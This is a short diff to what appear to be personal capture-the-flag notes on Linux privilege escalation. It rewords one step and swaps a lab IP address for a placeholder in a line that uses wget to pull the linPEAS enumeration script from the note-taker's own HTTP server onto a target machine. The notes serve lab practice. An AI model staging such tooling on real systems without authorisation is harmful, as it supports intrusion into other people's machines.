@@ -330,7 +330,7 @@ wftpserver
 Privilege Escalation 
 https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS 
 
-Install linpeas on my computer with this command : 
+Install linpeas on the ~ of my computer with this command : 
 
 ```
 wget https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
@@ -349,5 +349,5 @@ python3 -m http.server
 ![](../../../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260221124333.png)
 
 ```
-wget 10.10.15.237:8000/linpeas.sh
+wget ipofmymachine:8000/linpeas.sh
 ```
